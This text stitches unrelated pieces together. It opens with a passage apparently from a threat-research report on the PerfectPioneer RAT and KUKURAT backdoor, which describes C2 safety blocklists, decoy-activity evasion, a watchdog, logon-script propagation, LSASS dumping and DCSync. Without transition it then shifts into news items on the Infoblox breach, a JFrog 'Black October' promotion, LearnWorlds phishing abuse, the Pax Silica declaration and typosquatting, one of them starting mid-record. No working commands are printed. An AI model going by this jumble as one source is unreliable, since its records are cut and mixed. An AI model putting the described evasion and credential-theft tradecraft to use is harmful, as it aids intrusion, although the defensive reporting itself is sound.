The specific feature combinations vary across the variants. Certain iterations maintain a lightweight footprint and are feature-sparse, whereas other variants have a broader suite of credential harvesting, process manipulation and network tunneling utilities.

The six variants that we recovered are distinguished by their compiled project paths:

D:/proj/PerfectRat/agent/

D:/proj/http3/newhttp3/agent/

The isDangerousCommand Foolproof Mechanism

isDangerousCommand is one of the most notable and unprecedented features uncovered during our analysis. It is implemented in two specific variants that the author named Pioneer and rat_http3_cc.

Before executing any incoming command from the C2, the isDangerousCommand routine cross-references the instruction against a list of hard-coded commands. If it finds a match, the command is blocked entirely. The blocklist includes administrative commands that would be highly destructive or forensics-heavy (noisy) if executed and which security tools could potentially monitor. The inclusion of this operational “safety switch” prevents the operators from making mistakes that could result in the activity being detected.

Our analysis revealed that the hard-coded blocklist includes a mix of both Windows and Linux environment syntax, as Figure 3 shows.

Because Go code can be cross-compiled for Windows and Linux from the same source code, the inclusion of Linux syntax strongly suggests that the threat actor was developing a parallel Linux variant. The full list of blocked commands can be found in Appendix A: Foolproof Mechanism Blocked Commands.

KUKURAT: A Deep Dive into the Latest Modular Backdoor

In March 2026, the threat actor introduced a new custom payload explicitly named KUKURAT into multiple networks that had already been compromised by PerfectPioneer RAT.

Written in C++, we identified two variants of KUKURAT in the wild. While their core functionality is similar, the variants use different underlying network protocols to communicate with the C2: one variant leverages HTTP/2, the other uses HTTP/3.

Unlike PerfectPioneer RAT, KUKURAT is a completely modular malware framework. Almost every post-exploitation capability is implemented as a separate DLL module loaded dynamically at runtime directly from the C2 server. KUKURAT’s code supports at least 12 distinct named modules.

By pulling capabilities directly into memory only when needed, KUKURAT achieves a high level of evasiveness and adaptability. Because the static core binary contains no advanced feature code, it successfully evades standard binary scans, simplifies feature updates and prevents forensic analysts from recovering the underlying payloads.

Capabilities and Supported Commands

Due to its highly modular architecture, KUKURAT’s main binary lacks the embedded code required to perform post-exploitation activities. Instead, according to our analysis of the malware's underlying logic and compiled strings, the modules enable features related to data collection and exfiltration, command execution, reconnaissance and lateral movement.

The modules provide the following capabilities:

Screenshots and keylogging

Host and port scanning

Process management – listing processes, killing processes and process injection

File management – uploading, downloading, listing, deleting and executing files

Execution of native shell commands via cmd.exe and PowerShell

Lateral movement via PsExec

Server Message Block (SMB) credential brute-forcing

SOCKS tunneling

Local privilege elevation

Execution of Beacon Object Files (BOF)

Silent mode configuration

KUKURAT’s modular framework facilitates the loading and execution of any arbitrary external module, even if it does not match a pre-existing command handler in the base code. This allows the threat actor to dynamically introduce new capabilities and adapt to shifting operational needs in real time.

See Appendix B: KUKURAT Command Frame Architecture for the full list of KUKURAT commands.

Figure 4 shows a snippet of the KUKURAT code that executes the screenshot module. KUKURAT verifies whether the module is loaded before executing it using the hard-coded parameter capture that is passed to the loaded module. If the loading of the module or the screenshot capture fails, an error message is sent back to the operator.

Deployment of Separate KUKURAT Modules

During our investigation, we observed the attackers using KUKURAT to deploy two additional executables named PsExecService.exe and SecurityGuard.exe. While we could not retrieve SecurityGuard.exe, we successfully recovered PsExecService.exe for analysis.

According to the file's compiled program database (PDB) string, the attackers explicitly classify this binary as an external module of KUKURAT, despite it being compiled as a standalone executable rather than a DLL:

d:\proj\KUKURAT\modules\MyPsExec-master\PsExecService\

This tool is a custom remote execution service that appears may be partially based on the open-source MyPsExec GitHub project. Upon execution, PsExecService.exe registers itself as a local Windows service named PsExec and creates a named pipe called \\.\pipe\PSEXEC. The service natively supports four commands:

Shell execution

File uploading

File downloading

Directory listing

To limit its forensic footprint, the service employs an internal self-destruct timer that automatically uninstalls the service and cleans up its artifacts after five minutes of inactivity.

Spoofing Endpoint Activity: Heuristic Camouflage Engine

KUKURAT introduces a unique heuristic camouflage engine capable of operating across three system axes: network, registry and files. The purpose of this engine is to generate dummy, legitimate-looking activity on the endpoint to camouflage the malware's actual operations. By mimicking normal operational behavior, the threat actor establishes a false baseline, which may significantly affect automated detection and other forensic efforts. The threat actor can toggle each method on or off via the C2 command set_obfuscation:

Network noise generation: KUKURAT generates 10 decoy HTTP requests per operational cycle to randomly selected domains, pulled from a hard-coded list of 15 popular websites using randomly generated URL paths. This camouflages traffic, blending C2 communications into normal web noise.

Registry manipulation mimicking browser activity: KUKURAT mimics legitimate Google Chrome browser behavior by writing random data to the registry path HKCU\Software\Google\Chrome\BrowserCrashRecovery, reading the data back, and then deleting the key. It then opens and enumerates the HKCU\Software\Google\Update\ClientState registry key. The purpose of this sequence is to make the agent's registry operation appear like Chrome crash recovery.

File noise generation: The malware continuously creates temporary files with random names and randomized content inside the system %temp% directory, only to immediately delete them. This technique generates file system noise, masking the agent's file modifications.

While certain elements of this evasion technique have been previously documented across various malware families, KUKURAT distinguishes itself through a highly unique design choice. It can coordinate heuristic camouflage across three separate vectors, while dynamically enabling or disabling each feature at runtime.

The Watchdog Component

In multiple incidents, attackers deployed KUKURAT alongside a separate watchdog executable that ensures the malware remains active.

When KUKURAT’s main binary executes, it creates a dedicated thread to communicate with the companion watchdog component. KUKURAT writes its own active file path to a local named pipe called WINDOW_SEC_WATCHDOG, every three seconds. The companion watchdog process reads this path and pulls a heartbeat message every second. If 15 seconds pass without receiving a heartbeat, the watchdog assumes that KUKURAT has been terminated and automatically relaunches it using the cached file path.

On one occasion, we observed the threat actor deploying this watchdog component into the C:\ProgramData\Cyvera\Ransomware\ directory path. This folder structure was historically associated with Cortex XDR, demonstrating the threat actor’s attempt to lower suspicion by hiding within security-product directory structures.

Comparison of Variants

The investigation identified two distinct variants of KUKURAT, leveraging HTTP/2 and HTTP/3 respectively for C2 communications. Aside from the difference in network transport protocols, the two variants are structurally almost identical except for a few noteworthy code developments that affect the malware's development adaptability and operational survivability:

Command-handling architecture: In the HTTP/2 variant, the threat actor implemented a large, nested If-Else conditional chain inside a single command-handling function. All execution and module-loading logic is embedded directly within those conditions. The HTTP/3 variant demonstrates the transition to an array of function pointers that map to individual commands, creating a standalone function for each execution routine. This design shift enables the malware developers to add or remove capabilities on the fly more efficiently.

Built-in exec bypass command: While KUKURAT is engineered to function as a completely modular malware framework that loads code dynamically, the HTTP/3 variant introduces an explicit, natively coded command called exec. This command enables the attacker to spawn a subprocess directly on the host endpoint via CreateProcessA and pipe the resulting terminal output back to the C2 backend. Because this command does not exist in the HTTP/2 variant, its inclusion suggests that the author sought to provide a built-in survival option: allowing operators to run system commands natively without needing to fetch an external module DLL from the staging server.

Post-Exploitation and Network Propagation

The following section details TTPs used throughout this campaign to move laterally across compromised enterprise networks, gather credentials, transition from Active Directory control to endpoint infection and exfiltrate sensitive data.

Lateral Movement via Domain Log-on Scripts

The threat actor’s most notable method for network propagation involves the manipulation of domain log-on scripts, a stealthy persistence mechanism used to execute code across the environment. In addition, they use well-known tools and remote management protocols such as PsExec, Windows Management Instrumentation (WMI) and Windows Remote Management (WinRM).

After successfully compromising a Domain Controller, the attackers installed malicious log-on scripts. Consequently, whenever a legitimate user authenticated to the domain, the malicious script automatically executed on their local endpoint, triggering the download and execution of the KUKURAT malware.

Figure 5 illustrates the execution of a malicious log-on script that downloads and executes the KUKURAT malware to the infected host, as shown in Cortex XDR.

Figure 5. KUKURAT deployed via a malicious log-on script, as shown in Cortex XDR .

Figure 6 shows that the log-on script persistence technique triggered an alert, due to an uncommon startup process executing with a local or domain user Security Identifier (SID).

Credential Stealing Techniques

Upon gaining initial access, the threat actor employs multiple techniques to harvest credentials including Local Security Authority Subsystem Service (LSASS) memory dumping and Directory Service Replication (DCSync).

The threat actor also actively used a robust suite of credential-dumping tools, dual-use administrative tools and registry manipulation techniques, including:

Mimikatz and ProcDump

SharpDPAPI, to decrypt DPAPI credentials and secrets

Manually dumping the SAM and SYSTEM registry hives to extract local account hashes

LSASS Memory Dumping

The attackers leveraged a living off the land technique to dump the memory of the lsass.exe process. They misused the native comsvcs.dll Windows utility using the following command.

Directory Service Replication

To further compromise the identity infrastructure, the attackers executed DCSync attacks to extract password hashes directly from the Domain Controller. This allowed them to simulate the behavior of a Domain Controller replicating user credentials, as Figure 7 shows.

Data Exfiltration

After systematically moving through the network and harvesting high-privilege credentials, the threat actor initiated their primary objective: cyberespionage. Leveraging the PerfectPioneer RAT and KUKURAT malware families, the threat actor attempted to exfiltrate vast quantities of documents back to their C2 infrastructure. The targeted data predominantly consists of .pdf, .docx, .xlsx and .png files with filenames that suggest potential sensitive information in their content,with a pronounced focus on international relations and internal political affairs.

Beyond document exfiltration, the attackers also targeted email infrastructure. From their initial foothold on a compromised Exchange server, they executed various PowerShell commands to identify and misuse administrative privileges.

Reconnaissance for impersonation rights: The attackers first checked for accounts assigned the ApplicationImpersonation role. In Microsoft Exchange, this role allows a single account to impersonate any user (or a specific subset of users) in the organization. By leveraging this privilege, an account can access other mailboxes directly without needing to know or supply the explicit passwords of those individual users.

Title: Infoblox customer and staff data exposed in Sharepoint breach
Context: Networking and security firm Infoblox is investigating a third-party breach that allowed crims to access sensitive customer and staff data
Full Text: Networking and security firm Infoblox is investigating a third-party breach that allowed crims to access sensitive customer and staff data. "Infoblox is investigating a security event involving unauthorized access to certain company information through a compromised third-party data migration vendor,” a company spokesperson confirmed to The Register. According to sources, the compromised third-party data migration vendor had trusted access to Infoblox's SharePoint system, and the intruders used this vendor’s accounts and access to exfiltrate data directly from Microsoft SharePoint. This data included configuration information related to some customer's NIOS (Network Identity Operating System) deployments. These are saved snapshots of customers’ network data, such as DNS, DHCP configurations, Grid databases, and reporting logs, that can be used to fully recover the appliance or grid in case of a system failure or faulty upgrade. The intruders also stole employee data during the break-in. According to an email CEO Scott Harrell sent to employees, which The Register has seen, compromised employee details include financial information such as direct deposit details, contact info, dates of birth, and Social Security numbers for employees and dependents. Upon discovering the breach, Infoblox “immediately activated” its incident response procedures, and took steps to contain the incident, including hiring outside cybersecurity experts, the spokesperson said. “We have sent notifications about this security event and are providing support and guidance as appropriate,” the Infoblox spokesperson told us. “Based on our investigation to date, we have no indication that any Infoblox products, cloud services, software updates or build-and-release processes were involved. Our priority is to fully investigate and resolve this issue." Affected staff received a $100 "spot bonus" to buy password management services, and were warned to be "especially alert for phishing, vishing, fraud, or other suspicious communications." Infoblox also gave employees and their dependents free credit monitoring and identity protection for two years. Infoblox declined to answer our more detailed questions about the compromise, including the type of data exposed, and how many employees and customers might be affected. The Register will update this story as we learn more about the breach.®

Full Text:
In a single week in October 2026, security teams faced one serious security incident after another. A certificate authority failed, critical flaws in PHP were disclosed after a broken embargo, a popular open-source AI gateway was compromised, and developer platforms reported thefts of customer secrets. Industry insiders started calling the seemingly steady drumbeat of attacks “Black October.”

Any one of these incidents would have kept a security team busy. Collectively, they exposed a bottleneck that has little to do with any single exploit. Security teams are not short on vulnerability information. They are short on answers: what is affected in our environment, and how can we fix it – fast?

As JFrog CEO Shlomi Ben Haim put it: “A single weak link can cost far more than the fix. For LiteLLM and PHP2Shell, being caught off-guard means money, downtime, and customer trust. The companies that come through well are the ones that know exactly what they are running and can act within hours vs. days. JFrog’s role is to find the problems early, tell customers what to do, and make sure they can precisely determine their exposure.”

Three Pressures That Compound

Three forces explain why answers are getting harder to produce:

Volume: In the AI-accelerated landscape of 2026, based on our count of NIST National Vulnerability Database (NVD) records, 36,952 CVEs were published in Q3 2026 alone, more than triple the 11,725 published in Q3 2025 (as of November 16, 2026).

Exploitability: A severity score does not say whether a flaw is applicable in your environment. Triage by count alone wastes scarce resources and time.

Attacker Speed: A Cloud Security Alliance survey of more than 900 security leaders found that only 9% of organizations remediate critical or high-severity production vulnerabilities within 24 hours, while 74% take between one and seven days. Meanwhile, attackers can use AI to speed up exploitation, chaining together low-severity findings and making repeated automated attempts until one unpatched system gives them an opening.

That is a different kind of weakness, and it needs a different kind of approach. A faster version of the old process will not close it. AI pushes on all three pressures: it surfaces more flaws and drafts more fixes, but maintainers cannot absorb unlimited volume.

The Disclosure Process Wasn’t Built for This

The vulnerability disclosure process was designed around human review cycles. A researcher reports a flaw, a maintainer triages it, a fix is written, and a CVE is published. That rhythm worked when exploitation was also a manual effort. It does not hold up when attackers can automate discovery and exploitation at scale.

Enterprises have also historically depended on upstream maintainers to publish patches on their own timelines, and those timelines are asynchronous with the CVE disclosure window. In an AI-powered threat landscape, that mismatch becomes an exposure gap that attackers can use.

A new ecosystem of patching vendors has stepped in to help close it. These vendors produce signed, backported fixes for the exact versions enterprises actually consume, often ahead of public disclosure.

Why Does Threat Intelligence Alone Leave a Gap?

Threat intelligence describes the outside world, not your software environment. That difference explains why teams with excellent security vulnerability feeds still lose hours after a disclosure. Two gaps open between a published threat and a confident response:

Timing: Public databases trail events. As of October 2026, the National Institute of Standards and Technology (NIST) now enriches only a subset of CVEs, and PHP2Shell was being probed days before patches shipped. A process that waits for them is structurally late.

Remediation: Even with timely, contextual intelligence, someone still has to find a trustworthy fix, apply it across every affected artifact (assuming all artifacts are even traceable), and prove it worked. This is where many teams slow from hours to days.

Know Your Exposure With JFrog Threat Hub

Finding problems early and determining exposure precisely is the first half of the job. JFrog Threat Hub, a feature of JFrog Xray, brings JFrog Security Research findings and vetted external advisories into the same single source of truth that holds your scanned artifacts, so a published threat can be matched to your own environment in one step.

Knowing your exposure only matters if you can act on it quickly, which is the second half of the job.

Fortified Defenses Start With One Source of Truth

A month like October does not call for a faster version of the old process. It calls for a different one. In our view, LiteLLM and PHP2Shell showed what separates the teams that come through well: they could see what they run, and they could fix it fast.

Know everything you run

Start with an inventory at every layer: source code, packages, container images, AI models, and agent tooling. A component you cannot see cannot be prioritized or patched. Then verify what you deploy, not only what you wrote, because malicious code can live in built artifacts while the source stays clean. JFrog Artifactory serves as that single source of truth, holding the main artifact types (binaries, containers, AI models, MCP server packages) in one system of record.

Draw on an ecosystem of fix providers

Fix providers often specialize in particular software ecosystems, so drawing on an ecosystem of providers can help broaden coverage. In our view, reducing this risk requires two critical capabilities: high-quality patches across software ecosystems and a control plane designed to automate remediation at the binary level.

Close the loop with zero-touch remediation

A patch sitting in a vendor’s repository does nothing for an artifact already running in production. Artifactory can act as the control plane that ingests each fix from supported partners. JFrog Security can then apply a selected fix according to the customer’s policy and context, and produce a signed evidence chain that can support audit reviews. The goal is a self-healing software supply chain and zero-touch remediation that aims to help customers patch in hours rather than days. For branches past their end of life, migration remains the durable fix.

Ready for the Next Black October?

When the next disclosure lands, what is affected, and can we fix it in hours rather than days? Organizations that can provide a quality answer will weather the next crowded month. Those that cannot will spend it searching.

Move From Disclosure to Fix in Hours

Patching at scale takes a single source of truth, trusted fixes from an ecosystem of partners, and a universal control plane that applies them automatically. Context: According to Siozos, the attacker bypassed the platform's per-customer limit on trial subscriptions and exploited its welcome email feature to send the phishing emails
Full Text: LearnWorlds, a software and learning course platform, says an attacker sent 13,000 phishing emails to YouTube creators over seven days by using automated tools to open free trial accounts. The company insists its systems were not breached. Panos Siozos, Co-founder and CEO at LearnWorlds, said the miscreant created around 570 free trial accounts on the platform between November 7-14, which they used to issue fake copyright infringement notices to recipients of their choosing. "We have found no evidence of unauthorized access to existing customer schools or personal data held for our customers and their end users," he told The Register. According to Siozos, the attacker bypassed the platform's per-customer limit on trial subscriptions and exploited its welcome email feature to send the phishing emails. "In each trial they added their own list of target addresses and rewrote the standard welcome email as a fake copyright notice," he said. "Adding those users triggered the welcome email from our sending address." The first email was sent on November 7, after which the company detected the suspicious signups and blocked the first sender on November 9, although the attacker returned to send a second wave of emails within 40 minutes. LearnWorlds removed all the trial accounts by November 10 and one paid account, which was used to launch more emails, on November 14. "In total, around 13,000 emails were sent to addresses on external recipient lists supplied by the sender," said Siozos. "The trial accounts sent 9,853 between November 7-9, and the paid account sent 3,723 on November 14. "We can’t tell how many people clicked, because the link was disguised to hide clicks. The recipient addresses were the sender’s own list." The CEO confirmed that LearnWorlds has since enhanced its bot checks and is placing holds on new accounts if their emails trigger fraud flags. "We have also examined the novel patterns the attackers used to create more advanced scoring mechanisms. We have reported the phishing website so it can be taken down. Further measures are currently being examined. "Anyone who signed in on the fake page should change their Google password and review their account’s recent security activity." The company's confirmation follows suspicions of foul play aired by users on social media. User reports included copies of the emails they received, which demanded urgent responses to fake copyright infringement claims related to YouTube content. Among the more prominent recipients of the copyright infringement email notices was Marcus Hutchins, of WannaCry fame, who claimed he received an email from the company’s official mail server. The email, a copy of which Hutchins posted to X, referenced general intellectual property and copyright infringements but failed to specify any specific issues. The email prompted the recipient to click a YouTube link to see the “supporting documentation submitted by LearnWorks.” The link predictably turned out to be a YouTube redirect link, taking recipients to a separate website that presents them with a real Google OAuth page. If the user completed the authorization flow, it would have handed attackers control of the target’s Google and YouTube accounts. “The site is designed to look like an official YouTube webpage that enables users to review copyright claims against their channel,” Hutchins wrote. “It contains both the YouTube and Google branding, as well as a very similar theme to the official YouTube one.” According to Hutchins' screenshots, and those posted by others, the attacker was actively tweaking the email style and format, although the underlying lure and authentication mechanisms remained the same. Hutchins didn't specify exactly how the phishing page steals access to targets’ Google accounts, although his description aligns with the steps often seen in OAuth consent phishing attacks. These involve malicious websites serving victims genuine OAuth pages, into which unwitting victims enter their credentials and pass the relevant MFA tests. Typical scenarios see permission pages appear immediately after, and if the user accepts, the malicious website is handed OAuth access tokens to the victim’s account, effectively the keys to control it. LearnWorlds, based in Cyprus, claims to have two million active monthly learners on its platform accessing 900,000 courses and more than 14,000 business customers. Since launching in 2014, it claims to have generated more than $1 billion in revenue. The business focuses on white-label courses - training programs developed by one business and sold to another, assuming the buyer will change the branding and present the course materials as their own. ®

Title: US allies deepen deal to guard AI supply chains against 'hostile actors' (cough, China, cough)
Context: Pax Silica was announced in December last year, ostensibly for the participants to work together on vital parts of the global technology supply chain, including frontier...
Full Text: Nine countries including the UK have signed a US declaration pledging to secure supply chains for AI tech, as pressure grows for tighter export controls following the high-profile resignation of Nvidia CEO Jensen Huang. The US is firming up its Pax Silica initiative on AI and supply chain security. Under the San Francisco declaration, signed on November 15, the coalition says it is entering a new phase that turns shared principles into a working partnership with shared responsibilities. Pax Silica was announced in December last year, ostensibly for the participants to work together on vital parts of the global technology supply chain, including frontier foundation models, compute and semiconductors, advanced manufacturing, minerals refining and processing, and energy. But the list of participants was notable for not including one country – China – leading many to suspect that Pax Silica is yet another effort by Washington to squeeze out its main rival in the global technology and economic stakes. Hong-Kong based South China Morning Post refers to it as Trump's "campaign to China-proof AI and chip supply chains." The latest declaration states that "the security of our peoples cannot be separated from the security of our economies and those of our closest partners," and sets out what must be protected, as well as committing to "protect it together." It asserts that protection should cover key foundational technologies essential to economic security, listing "software, materials, knowledge, components and inputs…essential to AI supply chains." This includes anything that "theft, illicit transfer, or acquisition by hostile actors would confer a meaningful military or intelligence advantage, or undue economic leverage over the participants, or whose unauthorized transfer or misuse could pose significant risks to the economic and national security of the participants." Also listed is the protection of critical infrastructure such as ports, terminals, transport, communications, and logistics networks, and the ICT and energy infrastructure these depend upon. The declaration was jointly released by the US administration, and the governments of Australia, India, Israel, Japan, South Korea, Qatar, Singapore, United Arab Emirates, and the United Kingdom. "The know-how to design a chip, the machine that makes it, and the port that ships it can all be in different countries," the US under-secretary of state for economic affairs Jacob Helberg told the Financial Times. "What makes the San Francisco Declaration historic is that Pax Silica partners have agreed to treat the security of those technologies and the infrastructure behind them as a shared responsibility." This move comes amid reports that both Republican and Democrat lawmakers want to push through further measures to prevent China from accessing advanced chips for AI processing. It follows the recent news that Jensen Huang, the now former CEO of top GPU maker Nvidia, admitted to an affair with a woman suspected by the US of being a spy for Beijing. She worked for a Singapore-based company called Megaspeed that bought Nvidia hardware and was also suspected of making it available to Chinese users. US, Singaporean, and Malaysian police investigations are still probing whether chips were diverted or accessed remotely by Chinese firms. American efforts to control Chinese access to its technology started under the first Trump administration, and continued under President Joe Biden’s leadership. A report out last week claimed US export controls are not stopping AI labs in China from using restricted Nvidia chips, and many of their cutting-edge models were trained using Blackwell GPUs. It is understood that President Trump is to meet with China's premier Xi Jinping this week for bilateral talks on the sidelines of the Asia-Pacific Economic Co-operation (APEC) summit in Shenzhen. ®

Title: Typosquatters Target New Brand Domains Within 24 Hours of Registration
Context: “The findings highlight how attackers can exploit the period between a company's domain registration and its public launch, positioning lookalike websites to capture consumers...
Full Text:
Threat actors are impersonating big-name brands via typosquatting just one day after legitimate domains are created, according to new research from Symantec.

The active campaign, first observed in August, has seen 25 lookalike domains created which resembled authentic domain names used by companies such as Abbott Laboratories, Bayer, CarMax, McDonald’s, Procter & Gamble and Sanofi.

Every lookalike domain was registered within 24 hours of its authentic counterpart, often before the company even launched the new website.

“The findings highlight how attackers can exploit the period between a company's domain registration and its public launch, positioning lookalike websites to capture consumers who mistype legitimate addresses,” Symantec wrote.

Typosquatting is when malicious actors register domains that are slightly misspelled from a legitimate organization’s domain, such as one letter added or removed. This means that when a user accidently misspells a legitimate site name when typing the address by hand, they could be directed to a typosquatter’s site instead.

The fake websites are designed to closely resemble the organization they are impersonating.

These sites enable a range of follow-on malicious activity, such as directing users to scam sites, installing malware and harvesting credentials.

Attackers Focus on Campaign Sites to Maximize Effectiveness

The Symantec research, published on November 16, found that most of the malicious domains impersonated campaign sites rather than corporate home pages.

These included patient-savings programs, sweepstakes, rebates, claims portals and legal settlements.

Users are more likely to type such addresses by hand as these websites are often displayed on printed mailers, television advertisements, pharmacy leaflets and court-ordered settlement notices.

Campaign sites are also likely to ask visitors for personal information, such as names, addresses, claim numbers or health details, with visitors expecting to hand over such data upon arrival.

The typosquatting campaign focused on clients of two brand-protection registrars, Corporation Service Company (CSC) and MarkMonitor. Each time a large company registered a new domain through one of these registrars, a one-letter lookalike was registered the next day through a China-based registrar.

In one case, used car dealer CarMax registered carmaxclaims[.]com and kmxclaims[.]com through CSC on August 26. The next day, two lookalike domains were registered that removed the ‘s’ from each of the legitimate domains, carmaxclaim[.]com and kmxclaim[.]com.

Other typos used included leaving out other single letters and collapsing a double letter, for example, mywayconnect became mywayconect.

New lookalike domains were registered as recently as November 11, suggesting the campaign is ongoing.

Typosquat Domains Rapidly Monetized Through Ads and Scams

The observed typosquat domains appeared to have several purposes. Some were parked placeholder pages that earned money from pay-per-click advertising feeds, while others were deceptive search portals whose results led to scam blogs, or brand-themed blogs written around the typosquatted name and packed with ads that routed visitors to scam sites.

“This low-grade scam traffic may not be the end goal. Advertising networks of this kind can also be abused for malvertising and credential harvesting, and a domain that serves ads today could serve a fake claims form tomorrow with a single Domain Name System (DNS) or content change. Visitors who reach these domains are already primed to enter personal details,” Symantec noted.

Given the speed at which attackers published their lookalike domains following the campaign launch, the researchers believe the setup was likely automated.

“The actors’ tooling was not visible to us, but the evidence is consistent with a simple pipeline that watched new registrations, filtered on brand-protection registrars, generated a one-character variant and registered it before the next day was out,” the researchers added.
